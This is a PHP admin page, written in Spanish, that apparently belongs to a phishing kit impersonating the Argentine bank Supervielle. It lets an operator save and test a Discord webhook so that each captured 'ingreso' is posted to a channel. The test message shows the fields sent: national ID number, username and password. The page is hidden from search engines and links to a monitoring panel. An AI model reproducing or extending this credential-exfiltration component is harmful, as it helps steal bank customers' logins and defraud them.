<?php
declare(strict_types=1);

require_once dirname(__DIR__) . '/includes/auth.php';
require_once dirname(__DIR__) . '/includes/helpers.php';
require_panel();

$admin = current_admin();
$configPath = dirname(__DIR__) . '/config/config.php';
$cfg = app_config();
$error = '';
$success = '';

function save_discord_config(string $path, array $cfg): void
{
    $export = "<?php\nreturn " . var_export($cfg, true) . ";\n";
    if (file_put_contents($path, $export) === false) {
        throw new RuntimeException('No se pudo guardar config/config.php');
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $accion = (string) ($_POST['accion'] ?? 'guardar');
    $enabled = !empty($_POST['enabled']);
    $url = trim((string) ($_POST['webhook_url'] ?? ''));

    try {
        if ($accion === 'guardar') {
            if ($enabled && $url === '') {
                throw new RuntimeException('Si activás Discord, pegá la URL del webhook.');
            }
            if ($url !== '' && !preg_match('#^https://(discord\.com|discordapp\.com)/api/webhooks/#i', $url)) {
                throw new RuntimeException('La URL no parece un webhook de Discord válido.');
            }

            $cfg['discord']['enabled'] = $enabled && $url !== '';
            $cfg['discord']['webhook_url'] = $url;
            save_discord_config($configPath, $cfg);

            // refrescar cache estática de app_config no es posible sin reinicio;
            // forzamos recarga leyendo de nuevo en la misma request no aplica a static.
            $success = $cfg['discord']['enabled']
                ? 'Discord activado. Ya van a llegar los ingresos al canal.'
                : 'Discord desactivado / guardado.';
        }

        if ($accion === 'probar') {
            if ($url === '') {
                $url = (string) ($cfg['discord']['webhook_url'] ?? '');
            }
            if ($url === '') {
                throw new RuntimeException('Primero pegá y guardá la URL del webhook.');
            }

            $payload = [
                'username' => 'Supervielle Monitor',
                'embeds' => [[
                    'title' => 'Prueba de conexión',
                    'description' => 'Si ves este mensaje, Discord está bien configurado.',
                    'color' => 9043995,
                    'fields' => [
                        ['name' => 'Documento', 'value' => '00000000', 'inline' => true],
                        ['name' => 'Usuario', 'value' => 'prueba.discord', 'inline' => true],
                        ['name' => 'Clave', 'value' => '******', 'inline' => true],
                    ],
                    'timestamp' => gmdate('c'),
                ]],
            ];

            $result = discord_webhook_post($url, $payload);
            if (empty($result['ok'])) {
                throw new RuntimeException($result['error'] ?? 'No se pudo enviar a Discord.');
            }

            // si la prueba anda, también guardamos activado
            $cfg['discord']['enabled'] = true;
            $cfg['discord']['webhook_url'] = $url;
            save_discord_config($configPath, $cfg);
            $success = 'Mensaje de prueba enviado. Revisá tu canal de Discord.';
        }
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }

    // releer archivo fresco
    $cfg = require $configPath;
}

$enabled = !empty($cfg['discord']['enabled']);
$webhook = (string) ($cfg['discord']['webhook_url'] ?? '');
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord — Supervielle</title>
  <meta name="robots" content="noindex,nofollow">
  <link rel="stylesheet" href="../css/admin.css?v=20261114h">
  <style>
    @media (max-width: 520px) {
      .admin-card { padding: 20px 16px !important; }
      .row-btns .btn { width: 100%; }
    }
    .guide {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 14px 16px;
      margin: 0 0 18px;
      font-size: 14px;
      line-height: 1.45;
      color: #334155;
    }
    .guide ol { margin: 8px 0 0; padding-left: 18px; }
    .guide li { margin: 6px 0; }
    .status {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 6px 10px;
      border-radius: 999px;
      font-size: 12px;
      font-weight: 800;
      margin-bottom: 14px;
    }
    .status.on { background: #ecfdf3; color: #067647; }
    .status.off { background: #fef3f2; color: #b42318; }
    .dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; }
    .row-btns { display: flex; gap: 10px; flex-wrap: wrap; }
    .btn-secondary {
      background: #334155;
      color: #fff;
    }
    .top-links { margin-bottom: 12px; font-size: 14px; }
    .top-links a { color: #8a001b; font-weight: 700; text-decoration: none; }
  </style>
</head>
<body class="admin-auth">
  <div class="admin-card" style="width:min(560px,100%)">
    <div class="top-links">
      <a href="monitor.php">← Volver al monitoreo</a>
    </div>
    <h1>Conectar Discord</h1>
    <p class="muted">Para que cada ingreso te llegue al canal de trabajo.</p>

    <div class="status <?= $enabled && $webhook ? 'on' : 'off' ?>">
      <span class="dot"></span>
      <?= $enabled && $webhook ? 'Discord ACTIVADO' : 'Discord APAGADO' ?>
    </div>

    <?php if ($error): ?><p class="alert alert-error"><?= h($error) ?></p><?php endif; ?>
    <?php if ($success): ?><p class="alert alert-success"><?= h($success) ?></p><?php endif; ?>

    <div class="guide">
      <strong>Cómo sacar la URL (paso a paso)</strong>
      <ol>
        <li>Abrí <strong>Discord</strong> en la PC o en el celular.</li>
        <li>Entrá al <strong>servidor</strong> de tu equipo de trabajo.</li>
        <li>Elegí el <strong>canal</strong> donde querés recibir avisos (ej. #ingresos).</li>
        <li>Clic derecho en el canal → <strong>Editar canal</strong>.</li>
        <li>En el menú izquierdo tocá <strong>Integraciones</strong>.</li>
        <li>Tocá <strong>Webhooks</strong> → <strong>Nuevo webhook</strong>.</li>
        <li>Nombre: <strong>Supervielle Monitor</strong>.</li>
        <li>Tocá <strong>Copiar URL del webhook</strong>.</li>
        <li>Volvé acá, pegala abajo y tocá <strong>Guardar</strong>.</li>
        <li>Después tocá <strong>Enviar prueba</strong> y mirá el canal.</li>
      </ol>
    </div>

    <form method="post" class="admin-form">
      <label class="check">
        <input type="checkbox" name="enabled" value="1" <?= $enabled ? 'checked' : '' ?>>
        Activar avisos a Discord
      </label>

      <label>
        URL del webhook
        <input
          type="url"
          name="webhook_url"
          value="<?= h($webhook) ?>"
          placeholder="https://discord.com/api/webhooks/..."
          autocomplete="off"
        >
      </label>

      <div class="row-btns">
        <button class="btn btn-primary" type="submit" name="accion" value="guardar">Guardar</button>
        <button class="btn btn-secondary" type="submit" name="accion" value="probar">Enviar prueba</button>
      </div>
    </form>
  </div>
</body>
</html>
